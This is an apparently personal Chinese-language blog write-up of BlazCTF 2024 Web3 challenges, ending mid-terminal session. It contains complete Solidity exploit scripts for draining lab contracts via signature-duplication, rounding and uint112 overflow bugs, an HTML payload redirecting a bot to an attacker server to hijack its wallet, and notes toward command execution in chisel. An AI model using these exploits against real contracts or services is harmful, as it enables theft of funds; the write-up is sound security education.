---
title: BlazCTF 2024
date: 2024-09-23 14:21:49
tags: 
  - blockchain
  - ctf
typora-root-url: .
excerpt: BlazCTF 2024 是我第一場 Web3 CTF。這次是跟[竹狐](https://ctftime.org/team/280959)一起打（整隊只有我有碰過一點點 Web3 所以基本上是自己打）。題目品質整體算滿不錯的。
cover: /blazctf-2024/cover.webp
photos:
  - /blazctf-2024/cover.webp
---

[BlazCTF 2024](https://ctftime.org/event/2492/) 是我第一場 Web3 CTF，做個以後可以回來複製貼上的紀錄。這次是跟[竹狐](https://ctftime.org/team/280959)一起打（整隊只有我有碰過一點點 Web3 所以基本上是自己打），比賽時間剛好撞到修的網路安全實務與社會密集課程 QQ。題目品質整體算滿不錯的。官方的題目在 https://github.com/fuzzland/blazctf-2024/tree/main。

### Ciao

Welcome 題，給了一個 [transaction](https://app.sentio.xyz/tx/42161/0xd58271ed821a19fa5af95245e2be55782cad67f46556aa437e1af157267ce6d4?nav=s)，然後 flag 在 transaction 的一個 calldata 裡面。把他丟進 [CipherChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('None')From_Hex('Auto')&input=MzI2NTMyMzkzMDM5NjQzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMjMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMwMzAzMDMzNjQzNjM3MzY2NDMyMzEzMjMwMzUzNDM2MzgzNjM1MzIzMDM2MzYzNjYzMzYzMTM2MzczMjMwMzYzOTM3MzMzMjMwMzYzMjM2NjMzNjMxMzc2MTM3NjIzNTM3MzMzMzM2NjMzNjMzMzMzMDM2NjQzNjM1MzU2NjM1MzQzMzMwMzU2NjM1MzQzNjM4MzMzMzM1NjYzNzMwMzMzNDM3MzIzNzM0MzczOTM1NjYzNDY1MzMzMDM3MzczNTY2MzQzNzMzMzAzMzMwMzYzNDM1NjYzNDYzMzczNTM2MzMzNjYyMzU2NjM2NjQzNDM2MzMzMzM1MzIzNzY0MzAzMDMwMzAzMDMw) 裡面就有 flag 了。

![ciao](/blazctf-2024/ciao.webp)

### BigenLayer

#### 題目

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ERC20} from "./ERC20.sol";

contract iPhone16 is ERC20 {
    // [...]
}

contract BigenLayer {
    address public immutable owner;
    iPhone16 public immutable token;

    mapping(address => uint256) public stakedBalance;
    mapping(address => uint256) public withdrawalRequestTime;
    mapping(address => uint256) public pendingWithdrawals;
    mapping(address => address) public withdrawalRecipient;

    constructor(address _owner, iPhone16 _token) {
        owner = _owner;
        token = _token;
    }

    function stake(address onBehalf, uint256 amount) external {
        require(token.transferFrom(msg.sender, address(this), amount), "Transfer failed");
        stakedBalance[onBehalf] += amount;
    }

    function _requestWithdrawal(address user, uint256 amount, address recipient) internal {
        require(stakedBalance[user] >= amount, "Insufficient balance");
        stakedBalance[user] -= amount;
        pendingWithdrawals[user] += amount;
        withdrawalRequestTime[user] = block.timestamp;
        withdrawalRecipient[user] = recipient;
    }

    function requestWithdrawal(uint256 amount, address recipient) external {
        _requestWithdrawal(msg.sender, amount, recipient);
    }

    function adminRequestWithdrawal(address user, uint256 amount, address recipient) external {
        require(msg.sender == owner, "Only owner can call this function");
        _requestWithdrawal(user, amount, recipient);
    }

    function finalizeWithdrawal(address user) external {
        uint256 amount = pendingWithdrawals[user];
        require(amount > 0, "No pending withdrawal");
        require(block.timestamp >= withdrawalRequestTime[user] + 12 seconds, "Withdrawal too early");
        address recipient = withdrawalRecipient[user];
        pendingWithdrawals[user] = 0;
        require(token.transfer(recipient, amount), "Transfer failed");
    }
}

contract Challenge {
    address public immutable PLAYER;
    BigenLayer public immutable bigen;
    iPhone16 public immutable token;

    address public constant OWNER = 0x71556C38F44e17EC21F355Bd18416155000BF5a6;
    address public constant TIM_COOK = 0x2011082420110824201108242011082420110824;

    constructor(address player) {
        PLAYER = player;
        token = new iPhone16();
        bigen = new BigenLayer(OWNER, token);

        token.approve(address(bigen), type(uint256).max);
        bigen.stake(TIM_COOK, 16 * 10 ** 18);
    }

    function isSolved() external view returns (bool) {
        return token.balanceOf(PLAYER) >= 16 * 10 ** 18;
    }
}
```

#### 題解

`BigenLayer.OWNER` 的 private key 是 `0x1337`，用 `OWNER` 權限來 `BigenLayer.adminRequestWithdrawal` 即可。

#### 解題環境細節

##### 0. 環境建置 ([Dev Containers](https://code.visualstudio.com/docs/devcontainers/tutorial))

這邊會使用 [Damn Vulnerable DeFi](https://damnvulnerabledefi.xyz/) 所建置的 Dev container。在開始前需先安裝好 VSCode 跟 Docker。

接著到 [Damn Vulnerable DeFi 的 repository](https://github.com/theredguild/damn-vulnerable-defi/tree/v4.0.0)，裡面有個資料夾叫做 [.devcontainer](https://github.com/theredguild/damn-vulnerable-defi/tree/v4.0.0/.devcontainer)。把他整個載下來放到題目給的 Foundry project 資料夾裡。

<img src="/blazctf-2024/devcontainer-folder.webp" alt="devcontainer-folder" style="width: 20em;" />

接著使用 VSCode 打開 .devcontainer 的上層資料夾。VSCode 會問要不要在 Container 裡打開，點選 Reopen in Container。接著我們就有一個在 Docker 裡面的 foundry 環境了 🎉

<img src="/blazctf-2024/devcontainer-prompt.webp" alt="devcontainer-prompt" style="width: 42em;" />

接著記得將題目的環境變數設好。

```sh
> nc bigen-layer.chal.ctf.so 1337
ticket? d7965f43-9211-4501-9594-9f13733ef833
1 - launch new instance
2 - kill instance
3 - get flag
action? 1
creating private blockchain...
deploying challenge...

your private blockchain has been set up
it will automatically terminate in 1440 seconds
---
rpc endpoints:
    - http://rpc.ctf.so:8545/dUFaIQiZWNHwgWVQWVoijAFc/main
    - ws://rpc.ctf.so:8545/dUFaIQiZWNHwgWVQWVoijAFc/main/ws
private key:        0x440b27e18d2945173d24fc364512cb627d80263fac79182704519fd77ee06735
challenge contract: 0x93254FaE56400134F9b2592B156C9d0267950d97

> export RPC=http://rpc.ctf.so:8545/dUFaIQiZWNHwgWVQWVoijAFc/main
> export PLAYER=0x440b27e18d2945173d24fc364512cb627d80263fac79182704519fd77ee06735
> export CHALLENGE=0x93254FaE56400134F9b2592B156C9d0267950d97
```

##### 1. 給 `OWNER` 送一些 ethers，讓他能送 transaction

###### script/Solve_pre_pre.s.sol

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-ctf/CTFSolver.sol";
import "forge-std/Script.sol";
import "src/Challenge.sol";

contract Solve is Script {
    address public constant TIM_COOK = 0x2011082420110824201108242011082420110824;
    address public constant OWNER = 0x71556C38F44e17EC21F355Bd18416155000BF5a6;
    uint256 playerPrivateKey = vm.envOr("PLAYER", uint256(0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80));
    uint256 OwnerPrivateKey = 0x0000000000000000000000000000000000000000000000000000000000001337;

    function run() external {
        address challenge = vm.envAddress("CHALLENGE");
        solve(challenge, vm.addr(playerPrivateKey));
    }

    function solve(address challenge, address player) internal {
        vm.startBroadcast(playerPrivateKey);

        (bool success,) = OWNER.call{value: 1000000000000000}("");

        vm.stopBroadcast();
    }
}
```

```sh
# The script path may be different
forge script --fork-url $RPC script/Solve_pre_pre.s.sol -vvvv --broadcast --legacy
```

Or

```sh
cast send --private-key $PLAYER --value 1000000000000000 --rpc-url $RPC --legacy $OWNER '0x'
```

##### 2. 利用 `OWNER` 身分來  `BigenLayer.adminRequestWithdrawal`

###### `script/Solve_pre.s.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-ctf/CTFSolver.sol";
import "forge-std/Script.sol";
import "src/Challenge.sol";

contract Solve is Script {
    address public constant TIM_COOK = 0x2011082420110824201108242011082420110824;
    address public constant OWNER = 0x71556C38F44e17EC21F355Bd18416155000BF5a6;
    uint256 playerPrivateKey = vm.envOr("PLAYER", uint256(0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80));
    uint256 OwnerPrivateKey = 0x0000000000000000000000000000000000000000000000000000000000001337;

    function run() external {
        address challenge = vm.envAddress("CHALLENGE");
        solve(challenge, vm.addr(playerPrivateKey));
    }

    function solve(address challenge, address player) internal {
        vm.startBroadcast(OwnerPrivateKey);

        BigenLayer bigenLayer = Challenge(challenge).bigen();
        bigenLayer.adminRequestWithdrawal(TIM_COOK, 16 * 10 ** 18, player);

        vm.stopBroadcast();
    }
}
```

```sh
forge script --fork-url $RPC script/Solve_pre.sol -vvvv --broadcast --legacy
```

##### 3. Finalize Withdrawal

###### script/Solve_post.sol

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-ctf/CTFSolver.sol";
import "src/Challenge.sol";

contract Solve is CTFSolver {
    address public constant TIM_COOK = 0x2011082420110824201108242011082420110824;
    function solve(address challenge, address player) internal override {
        BigenLayer bigenLayer = Challenge(challenge).bigen();
        bigenLayer.finalizeWithdrawal(TIM_COOK);
    }
}
```

這邊直接繼承了 forge-ctf/CTFSolver.sol，所以只要把 `CHALLENGE` 跟 `PLAYER` 的環境變數設好，其他部分就不用自己寫了。(`PLAYER` 的環境變數是 player 的 private key)，執行這部的時候要跟前一步距離一些時間來滿足 `bigenLayer.finalizeWithdrawal`  的條件。

```sh
forge script --fork-url $RPC script/Solve_post.sol -vvvv --broadcast --legacy
```

### Tonyallet

#### 題目

> Tony Ads #2 After his DeFi dreams crashed, Tony pivoted to SocialFi, crafting a buzzword-laden pitch that had VCs practically throwing money at him, all while he secretly chuckled at the irony of his newfound success.
>
> Ping @tonyalletbot on Telegram! You can also report posts at https://tonyallet-us-report.ctf.so/

題目給了一個 [Telegram Mini App](https://core.telegram.org/bots/webapps)，可以透過 Telegram 打開其網頁與其互動。題目還給了 Report bot，他會做以下[步驟](https://docs.google.com/document/d/1YMkYTSOmG_Dg9OIsVlCGAKfvMPYYij9ZVCSXIPqFwes/edit?usp=sharing)：

<img src="/blazctf-2024/tony-wallet-step12.webp" alt="tony-wallet-step12" style="width: 25em;" />

<img src="/blazctf-2024/tony-wallet-step34.webp" alt="tony-wallet-step12" style="width: 25em;" />

#### 題解

Bot 會去看 `/post?id=<user_provided_id>` 頁面，裡面用了 DomPurify 所以很難 XSS（如下），但是題目說 bot 會去點擊按鈕。可以透過製造一個很大的 `<a>` 讓 bot 點進我們可控的網頁。

```javascript
async function getPost(postId) {
    try {
        const response = await fetch(`/posts/${postId}`, {
            method: 'GET'
        });
        const data = await response.json();
        const postDetails = document.getElementById('postDetails');
        postDetails.innerHTML = DOMPurify.sanitize(
            `
            <h3>${data.title}</h3>
            <p>${data.content}</p>
            <p>Author Hash: ${data.author}</p>
            <p>Timestamp: ${new Date().toISOString()}</p>
        `, { USE_PROFILES: { html: true } }
        );
    } catch (error) {
        console.error('Error fetching post:', error);
        alert('Failed to retrieve post. Please check the UUID and try again.');
    }
}

function goBack() {
    window.history.back();
}

const query = decodeURIComponent(window.location.search)
const pid = query.split("=")[1];
getPost(pid);
```

```html
# 我們的巨大 <a> 按鈕
<a href="https://<attacker_c2_server>/" style="width:100%;height:100%;position:fixed;background:#ff0;top:0;left:0;"></a>
```

在我們可控的頁面，把 bot 重新導向到帶著我們自己 `#tgWebAppData` 的 Telegram Mini App 首頁網址（如下）。

```html
<script>
    location = 'https://tonyallet-us.ctf.so/#tgWebAppData=query_id...'
</script>
```

這樣 bot browser 的 localStorage 的 `walletAddress` 就會被設成我們的 address。當 bot 再次進入首頁時，抓到的就會是我們的 address（如下），所以會送 Ether 進來我們的 address，就解了。他 flag 給的方式有點通靈，會藏在流量裡。

```solidity
const tg = window.Telegram.WebApp || {
    initData: 123
}

async function getWallet(bypass=false) {
    let localAddress = localStorage.getItem("walletAddress")
    if (localAddress && !bypass) {
        document.getElementById('walletAddress').textContent = localAddress;
        return
    }
    try {
        const response = await fetch(`/wallet`, {
            method: 'GET',
            headers: {
                'Authorization': tg.initData
            }
        });
        const data = await response.json();
        document.getElementById('walletAddress').textContent = data.address;
        localStorage.setItem("walletAddress", data.address);
    } catch (error) {
        console.error('Error fetching wallet:', error);
        alert('Failed to generate wallet. Please try again.');
    }
}
// [...]
getWallet()
```

### Cyber Cartel

#### 題目

```solidity
contract Challenge {
    address public immutable TREASURY;

    constructor(address treasury) {
        TREASURY = treasury;
    }

    function isSolved() external view returns (bool) {
        return address(TREASURY).balance == 0;
    }
}
contract CartelTreasury {
    uint256 public constant MIN_TIME_BETWEEN_SALARY = 1 minutes;

    address public bodyGuard;
    mapping(address => uint256) public lastTimeSalaryPaid;

    function initialize(address bodyGuard_) external {
        require(bodyGuard == address(0), "Already initialized");
        bodyGuard = bodyGuard_;
    }

    modifier guarded() {
        require(bodyGuard == address(0) || bodyGuard == msg.sender, "Who?");
        _;
    }

    function doom() external guarded {
        payable(msg.sender).transfer(address(this).balance);
    }

    /// Dismiss the bodyguard
    function gistCartelDismiss() external guarded {
        bodyGuard = address(0);
    }

    /// Payout the salary to the caller every 1 minute
    function salary() external {
        require(block.timestamp - lastTimeSalaryPaid[msg.sender] >= MIN_TIME_BETWEEN_SALARY, "Too soon");
        lastTimeSalaryPaid[msg.sender] = block.timestamp;
        payable(msg.sender).transfer(0.0001 ether);
    }

    receive() external payable {}
}
contract BodyGuard {
    bytes public constant DIGEST_SEED = hex"80840397b652018080";
    address public treasury;
    uint8 lastNonce = 0;
    uint8 minVotes = 0;
    mapping(address => bool) public guardians;

    struct Proposal {
        uint32 expiredAt;
        uint24 gas;
        uint8 nonce;
        bytes data;
    }

    constructor(address treasury_, address[] memory guardians_) {
        require(treasury == address(0), "Already initialized");
        treasury = treasury_;
        for (uint256 i = 0; i < guardians_.length; i++) {
            guardians[guardians_[i]] = true;
        }

        minVotes = uint8(guardians_.length);
    }

    function propose(Proposal memory proposal, bytes[] memory signatures) external {
        require(proposal.expiredAt > block.timestamp, "Expired");
        require(proposal.nonce > lastNonce, "Invalid nonce");

        uint256 minVotes_ = minVotes;
        if (guardians[msg.sender]) {
            minVotes_--;
        }

        require(minVotes_ <= signatures.length, "Not enough signatures");
        require(validateSignatures(hashProposal(proposal), signatures), "Invalid signatures");

        lastNonce = proposal.nonce;

        uint256 gasToUse = proposal.gas;
        if (gasleft() < gasToUse) {
            gasToUse = gasleft();
        }

        (bool success,) = treasury.call{gas: gasToUse * 9 / 10}(proposal.data);
        if (!success) {
            revert("Execution failed");
        }
    }

    function hashProposal(Proposal memory proposal) public view returns (bytes32) {
        return keccak256(
            abi.encodePacked(proposal.expiredAt, proposal.gas, proposal.data, proposal.nonce, treasury, DIGEST_SEED)
        );
    }

    function validateSignatures(bytes32 digest, bytes[] memory signaturesSortedBySigners) public view returns (bool) {
        bytes32 lastSignHash = bytes32(0); // ensure that the signers are not duplicated

        for (uint256 i = 0; i < signaturesSortedBySigners.length; i++) {
            address signer = recoverSigner(digest, signaturesSortedBySigners[i]);
            require(guardians[signer], "Not a guardian");

            bytes32 signHash = keccak256(signaturesSortedBySigners[i]);
            if (signHash <= lastSignHash) {
                return false;
            }

            lastSignHash = signHash;
        }

        return true;
    }

    function recoverSigner(bytes32 digest, bytes memory signature) public pure returns (address) {
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }
        return ecrecover(digest, v, r, s);
    }
}
```

#### 題解

在 `BodyGuard::validateSignatures` 中，沒有檢查好有無同個人重複簽名。可以在同個人的簽名 encodePacked 的內容後面塞一些垃圾，合約就會以為是不同人簽的，但 ecrecover 解出來的仍然是正確的。如下。

```solidity
bytes[] memory signaturesSortedBySigners = new bytes[](2);

uint8 v; bytes32 r; bytes32 s;
(v, r, s) = vm.sign(playerPrivateKey, proposalHash);
signaturesSortedBySigners[0] = abi.encodePacked(r, s, v);

(v, r, s) = vm.sign(playerPrivateKey, proposalHash);
signaturesSortedBySigners[1] = abi.encodePacked(r, s, v, address(0x1));

guard.propose(proposal, signaturesSortedBySigners);
```

#### 解題環境細節

在解題過程需要測試，這邊拿 [Damn Vulnerable DeFi](https://damnvulnerabledefi.xyz/) 的 test script 來改，測試起來蠻方便的。

###### test/Solve.t.sol

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import "forge-ctf/CTFDeployer.sol";
import "src/CyberCartel.sol";
import "src/Challenge.sol";

contract CyberCartelChallenge is Test {
    uint256 playerPrivateKey = uint256(keccak256("player"));
    address player = vm.addr(playerPrivateKey);

    Challenge challenge;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // startHoax(deployer);
        address system = makeAddr("system");
        uint256 privateKey = uint256(keccak256("CyberCartel"));
        address deployer = vm.addr(privateKey);

        CartelTreasury cartel;
        vm.deal(system, 1000 ether);

        {
            vm.startBroadcast(system);
            t(deployer, 888 ether);
            vm.stopBroadcast();
        }

        {
            vm.startBroadcast(privateKey);

            address guardian1 = 0xA66bA931da982b11a2f3b89d1D732537EA4bc30D;
            address guardian2 = 0xa66ba931dA982b11A2F3B89d1d732537ea4bC30E;
            address guardian3 = player;

            t(guardian1, 10 ether);
            t(guardian2, 10 ether);
            t(guardian3, 10 ether);

            cartel = new CartelTreasury();
            address[] memory guardians = new address[](3);
            guardians[0] = 0xA66bA931da982b11a2f3b89d1D732537EA4bc30D;
            guardians[1] = 0xa66ba931dA982b11A2F3B89d1d732537ea4bC30E;
            guardians[2] = player;
            address bodyguard = address(new BodyGuard(address(cartel), guardians));

            cartel.initialize(bodyguard);
            t(address(cartel), 777 ether);

            vm.stopBroadcast();
        }

        vm.startBroadcast(system);
        challenge = new Challenge(address(cartel));
        vm.stopBroadcast();    
    }

    function t(address r, uint256 v) internal {
        (bool success,) = r.call{value: v}("");
        require(success, "Failed to send ETH");
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_solve() public checkSolvedByPlayer {
        CartelTreasury cartel = CartelTreasury(payable(challenge.TREASURY()));
        BodyGuard guard = BodyGuard(cartel.bodyGuard());

        BodyGuard.Proposal memory proposal = BodyGuard.Proposal({
            expiredAt: uint32(block.timestamp + 1 days),
            gas: 100000,
            data: abi.encodeWithSignature("gistCartelDismiss()"),
            nonce: 1
        });

        bytes32 proposalHash = guard.hashProposal(proposal);
        bytes[] memory signaturesSortedBySigners = new bytes[](2);

        uint8 v; bytes32 r; bytes32 s;
        (v, r, s) = vm.sign(playerPrivateKey, proposalHash);
        signaturesSortedBySigners[0] = abi.encodePacked(r, s, v);

        (v, r, s) = vm.sign(playerPrivateKey, proposalHash);
        signaturesSortedBySigners[1] = abi.encodePacked(r, s, v, address(0x1));

        guard.propose(proposal, signaturesSortedBySigners);

        cartel.doom();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        require(challenge.isSolved() == true, "Challenge not solved");
    }
}
```

```sh
forge test -vvvv
```

---

分隔線上是賽中解的，這次有一堆題目都差一點就解的。感覺蠻適合進步用。整體難度應該算對我學習蠻優良的。

### 8Inch

#### 題目

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ERC20.sol";
import "./SafeUint112.sol";
import "forge-std/console.sol";

contract TradeSettlement is SafeUint112 {
    struct Trade {
        address maker;
        address taker;
        address tokenToSell;
        address tokenToBuy;
        uint112 amountToSell;
        uint112 amountToBuy;
        uint112 filledAmountToSell;
        uint112 filledAmountToBuy;
        bool isActive;
    }

    mapping(uint256 => Trade) public trades;
    uint256 public nextTradeId;
    bool private locked;
    uint256 public fee = 30 wei;

    event TradeCreated(uint256 indexed tradeId, address indexed maker, address tokenToSell, address tokenToBuy, uint256 amountToSell, uint256 amountToBuy);
    event TradeSettled(uint256 indexed tradeId, address indexed settler, uint256 settledAmountToSell);
    event TradeCancelled(uint256 indexed tradeId);

    modifier nonReentrant() {
        require(!locked, "ReentrancyGuard: reentrant call");
        locked = true;
        _;
        locked = false;
    }

    function createTrade(
        address _tokenToSell,
        address _tokenToBuy,
        uint256 _amountToSell,
        uint256 _amountToBuy
    ) external nonReentrant {
        require(_tokenToSell != address(0) && _tokenToBuy != address(0), "Invalid token addresses");

        uint256 tradeId = nextTradeId++;
        trades[tradeId] = Trade({
            maker: msg.sender,
            taker: address(0),
            tokenToSell: _tokenToSell,
            tokenToBuy: _tokenToBuy,
            amountToSell: safeCast(_amountToSell - fee),
            amountToBuy: safeCast(_amountToBuy),
            filledAmountToSell: 0,
            filledAmountToBuy: 0,
            isActive: true
        });

        require(IERC20(_tokenToSell).transferFrom(msg.sender, address(this), _amountToSell), "Transfer failed");

        emit TradeCreated(tradeId, msg.sender, _tokenToSell, _tokenToBuy, _amountToSell, _amountToBuy);
    }

    function scaleTrade(uint256 _tradeId, uint256 scale) external nonReentrant {
        require(msg.sender == trades[_tradeId].maker, "Only maker can scale");
        Trade storage trade = trades[_tradeId];
        require(trade.isActive, "Trade is not active");
        require(scale > 0, "Invalid scale");
        require(trade.filledAmountToBuy == 0, "Trade is already filled");
        uint112 originalAmountToSell = trade.amountToSell;
        trade.amountToSell = safeCast(safeMul(trade.amountToSell, scale));
        trade.amountToBuy = safeCast(safeMul(trade.amountToBuy, scale));
        uint256 newAmountNeededWithFee = safeCast(safeMul(originalAmountToSell, scale) + fee);
        if (originalAmountToSell < newAmountNeededWithFee) {
            require(
                IERC20(trade.tokenToSell).transferFrom(msg.sender, address(this), newAmountNeededWithFee - originalAmountToSell),
                "Transfer failed"
            );
        }
    }

    function settleTrade(uint256 _tradeId, uint256 _amountToSettle) external nonReentrant {
        Trade storage trade = trades[_tradeId];
        require(trade.isActive, "Trade is not active");
        require(_amountToSettle > 0, "Invalid settlement amount");
        uint256 tradeAmount = _amountToSettle * trade.amountToBuy;

        require(trade.filledAmountToSell + _amountToSettle <= trade.amountToSell, "Exceeds available amount");

        require(IERC20(trade.tokenToBuy).transferFrom(msg.sender, trade.maker, tradeAmount / trade.amountToSell), "Buy transfer failed");
        require(IERC20(trade.tokenToSell).transfer(msg.sender, _amountToSettle), "Sell transfer failed");

        trade.filledAmountToSell += safeCast(_amountToSettle);
        trade.filledAmountToBuy += safeCast(tradeAmount / trade.amountToSell);

        if (trade.filledAmountToSell > trade.amountToSell) {
            trade.isActive = false;
        }

        emit TradeSettled(_tradeId, msg.sender, _amountToSettle);
    }

    function cancelTrade(uint256 _tradeId) external nonReentrant {
        Trade storage trade = trades[_tradeId];
        require(msg.sender == trade.maker, "Only maker can cancel");
        require(trade.isActive, "Trade is not active");

        uint256 remainingAmount = trade.amountToSell - trade.filledAmountToSell;
        if (remainingAmount > 0) {
            require(IERC20(trade.tokenToSell).transfer(trade.maker, remainingAmount), "Transfer failed");
        }

        trade.isActive = false;

        emit TradeCancelled(_tradeId);
    }

    function getTrade(uint256 _tradeId) external view returns (
        address maker,
        address taker,
        address tokenToSell,
        address tokenToBuy,
        uint256 amountToSell,
        uint256 amountToBuy,
        uint256 filledAmountToSell,
        uint256 filledAmountToBuy,
        bool isActive
    ) {
        Trade storage trade = trades[_tradeId];
        return (
            trade.maker,
            trade.taker,
            trade.tokenToSell,
            trade.tokenToBuy,
            trade.amountToSell,
            trade.amountToBuy,
            trade.filledAmountToSell,
            trade.filledAmountToBuy,
            trade.isActive
        );
    }
}

contract Challenge {
    TradeSettlement public tradeSettlement;
    SimpleERC20 public wojak;
    SimpleERC20 public weth;

    constructor() {
        tradeSettlement = new TradeSettlement();

        weth = new SimpleERC20("Wrapped Ether", "WETH", 18, 10 ether);
        wojak = new SimpleERC20("Wojak", "WOJAK", 18, 10 ether);

        wojak.approve(address(tradeSettlement), 10 ether);

        // Sell 10 WOJAK for 1 weth
        tradeSettlement.createTrade(address(wojak), address(weth), 10 ether, 1 ether);
    }

    function isSolved() public view returns (bool) {
        return wojak.balanceOf(address(0xc0ffee)) >= 10 ether;
    }
}
```

###### SafeUint112.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SafeUint112 {
    /// @dev safeCast is a function that converts a uint256 to a uint112, and reverts on overflow
    function safeCast(uint256 value) internal pure returns (uint112) {
        require(value <= (1 << 112), "SafeUint112: value exceeds uint112 max");
        return uint112(value);
    }

    /// @dev safeMul is a function that multiplies two uint112 values, and reverts on overflow
    function safeMul(uint112 a, uint256 b) internal pure returns (uint112) {
        require(uint256(a) * b <= (1 << 112), "SafeUint112: value exceeds uint112 max");
        return uint112(a * b);
    }
}
```

#### 題解

`tradeSettlement::settleTrade` 在判斷要收多少 token，使用了向下取整（`tradeAmount / trade.amountToSell`），可以藉此來免費買 token。如下，一次可以買到 9 個。要解題至少要拿 10 ether 個，所以只靠這個是不夠的。在賽中以為他的 `SafeUint112` 是安全的，所以賽中到這就沒繼續解了。但其實問題就在 其中。

```solidity
uint256 fee = 30 wei;
uint256 amountToSell = 10 ether - fee;
uint256 amountToBuy = 1 ether;
uint256 _amountToSettle = amountToSell / amountToBuy;

require(_amountToSettle * amountToBuy / amountToSell == 0, "not free");

tradeSettlement.settleTrade(0, _amountToSettle);
```

##### `SafeUint112`

`SafeUint112.safeCast` 的 `value <= (1 << 112)` 應該要用 `<`。不然在 `value = 1 << 112` 時會 overflow。

```solidity
contract SafeUint112 {
    /// @dev safeCast is a function that converts a uint256 to a uint112, and reverts on overflow
    function safeCast(uint256 value) internal pure returns (uint112) {
        require(value <= (1 << 112), "SafeUint112: value exceeds uint112 max");
        return uint112(value);
    }
}
```

```solidity
> uint256 a = 1 << 112;
> console.log(uint112(a));

Logs:
  0
```

#### 解題腳本

```solidity
contract Solve is CTFSolver {    
    function solve(address challenge, address player) internal override {
        TradeSettlement tradeSettlement = Challenge(challenge).tradeSettlement();
        uint256 fee = 30 wei;
        uint256 amountToSell = 10 ether - fee;
        uint256 amountToBuy = 1 ether;
        uint256 _amountToSettle = amountToSell / amountToBuy;

        require(_amountToSettle * amountToBuy / amountToSell == 0, "not free");

        for (uint256 amountDrained = 0; amountDrained < fee; amountDrained += _amountToSettle) 
            tradeSettlement.settleTrade(0, _amountToSettle);

        SimpleERC20 wojak = Challenge(challenge).wojak();
        wojak.approve(address(tradeSettlement), type(uint256).max);

        tradeSettlement.createTrade(address(wojak), address(wojak), fee+1, 0);

        // make `uint112(scale+fee) == 0` so we won't be charged when scaling
        uint256 scale = (1 << 112) - fee;
        tradeSettlement.scaleTrade(1, scale);

        tradeSettlement.settleTrade(1, wojak.balanceOf(address(tradeSettlement)));
        wojak.transfer(address(0xc0ffee), 10 ether);
    }
}
```

### Chisel as a Service

#### 題目

目標：取得 `/flag-<flag_hash>.txt` 內容

```javascript
import express from "express";
import { $ } from "zx";

const app = express();
const PORT = 3000;

app.use(express.static("public"));

app.get("/run", async (req, res) => {
  try {
    const code = String(req.query.code);
    if(/^[\x20-\x7E\r\n]*$/.test(code) === false)
      console.log("Invalid characters");
    console.log(code);
    console.log(encodeURIComponent(code));
    const commands = code.toLowerCase().match(/![a-z]+/g);
    console.log(commands);
    console.log(commands !== null && (commands.includes("!exec") || commands.includes("!e")));
    if (commands !== null && (commands.includes("!exec") || commands.includes("!e")))
      console.log("!exec is not allowed");
    const uuid = crypto.randomUUID();
    await $({
      cwd: "public/out",
      timeout: "3s",
      input: code,
    })`chisel --no-vm > ${uuid}`;
    res.send({ uuid });
  } catch {
    res.status(500).send("error");
  }
});

app.listen(PORT);
```

#### 題解

讀了一下 chisel 的 source code，發現有兩處使用了危險函數。

`ChiselCommand::Exec` 的 `arg` 可控，但是在 JavaScript 端會進行過濾，不能出現 `!exec` 跟 `!e`。看了一下 rust 端怎麼 parse 的但沒找到繞過的方法。

https://github.com/foundry-rs/foundry/blob/dab903633e4f01db8c604655bfe3c03a893c0827/crates/chisel/src/dispatcher.rs#L623

```rust
ChiselCommand::Exec => {
    // [...]
    let mut cmd = Command::new(args[0]);
    if args.len() > 1 {
        cmd.args(args[1..].iter().copied());
    }

    match cmd.output() {
        // [...]
    }
}
```

`ChiselCommand::Edit` 裡若可以控環境變數就能自由 RCE，所以要研究哪邊可以控環境變數。Foundry Cheatcode 有可以控環境變數的 [vm.setEnv](https://book.getfoundry.sh/cheatcodes/set-env)，但在 JavaScript 指定了 ` --no-vm` 的參數所以沒有 `vm` 可以用，賽中沒有想到其他可控環境變數的方法。賽後得知其實在  ` --no-vm` 情況下還是有辦法取得 `vm` 的。

https://github.com/foundry-rs/foundry/blob/dab903633e4f01db8c604655bfe3c03a893c0827/crates/chisel/src/dispatcher.rs#L651

```rust
ChiselCommand::Edit => {
    // [...]

    // open the temp file with the editor
    let editor = std::env::var("EDITOR").unwrap_or_else(|_| "vim".to_string());
    let mut cmd = Command::new(editor);
    cmd.arg(&temp_file_path);

    match cmd.status() {
        // [...]
    }
}
```

在有 vm 的 chisel 裡面得知 `vm` 的地址。

```sh
➜ address(vm)
Type: address
└ Data: 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D
```

可以看到確實在 `--no-vm` 的情況下可以正常設置環境變數。

```sh
> chisel --no-vm
Welcome to Chisel! Type `!help` to show available commands.
